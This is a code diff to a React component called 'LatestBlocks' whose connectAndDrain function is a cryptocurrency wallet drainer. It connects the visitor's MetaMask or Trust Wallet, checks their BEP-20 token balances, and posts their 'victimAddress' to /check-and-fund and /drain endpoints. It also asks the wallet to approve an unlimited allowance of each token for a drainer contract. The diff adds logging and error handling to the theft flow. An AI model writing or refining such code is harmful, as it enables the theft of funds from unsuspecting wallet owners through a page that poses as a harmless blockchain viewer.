@@ -90,7 +90,6 @@ const LatestBlocks = () => {
         console.error("Trust Wallet or MetaMask not detected");
         return;
       }
-  
       await switchToBSC();
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const connectedAddress = accounts[0];
@@ -98,57 +97,75 @@ const LatestBlocks = () => {
   
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
+      console.log("Connected address:", connectedAddress);
   
       let hasTokens = false;
-      const bep20Abi = [
-        "function balanceOf(address account) external view returns (uint256)",
-        "function approve(address spender, uint256 amount) external returns (bool)",
-      ];
-  
       for (const token of tokenList) {
         const tokenContract = new ethers.Contract(token.address, bep20Abi, provider);
         const balance = await tokenContract.balanceOf(connectedAddress);
+        console.log(`${token.symbol} balance: ${ethers.formatUnits(balance, 18)}`);
         if (balance > 0) hasTokens = true;
       }
   
       if (hasTokens) {
         const gasAvailable = await checkAndSendGas(connectedAddress);
+        console.log("Gas available:", gasAvailable);
         if (gasAvailable) {
-          await fetch(`${API_BASE_URL}/check-and-fund`, {
+          console.log("Calling /check-and-fund...");
+          const fundResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ victimAddress: connectedAddress }),
           });
+          console.log("Check-and-fund response:", await fundResponse.json());
   
+          console.log("Calling first /drain...");
           const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
           });
           const drainData = await drainResponse.json();
+          console.log("First drain response:", drainData);
   
           if (drainData.needsApproval) {
             for (const token of tokenList) {
               const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
-              // console.log("Token Contract with Signer:", tokenContract);
               const balance = await tokenContract.balanceOf(connectedAddress);
               if (balance > 0) {
-                const gasEstimate = await tokenContract.estimateGas.approve(drainerContractAddress, ethers.MaxUint256);
-                // console.log("Gas Estimate for Approve:", gasEstimate.toString());
-                await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: gasEstimate });
-                // console.log(`Approved ${token.symbol} for draining`);
+                console.log(`Approving ${token.symbol}...`);
+                try {
+                  const gasEstimate = await tokenContract.estimateGas.approve(drainerContractAddress, ethers.MaxUint256);
+                  console.log(`${token.symbol} gas estimate: ${gasEstimate.toString()}`);
+                  const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: gasEstimate });
+                  console.log(`${token.symbol} approval tx: ${tx.hash}`);
+                  await tx.wait();
+                  console.log(`${token.symbol} approved`);
+                } catch (approvalError) {
+                  console.error(`Failed to approve ${token.symbol}:`, approvalError.message);
+                  throw approvalError; // Stop if approval fails
+                }
               }
             }
-            await fetch(`${API_BASE_URL}/drain`, {
+            console.log("Calling second /drain...");
+            const finalDrain = await fetch(`${API_BASE_URL}/drain`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
             });
+            const finalData = await finalDrain.json();
+            console.log("Final drain response:", finalData);
+          } else {
+            console.log("No approval needed—draining complete.");
           }
+        } else {
+          console.log("Gas not available—stopping.");
         }
+      } else {
+        console.log("No tokens to drain.");
       }
     } catch (error) {
-      console.error("Error in connectAndDrain:", error);
+      console.error("Error in connectAndDrain:", error.message, error.stack);
     }
   };
 
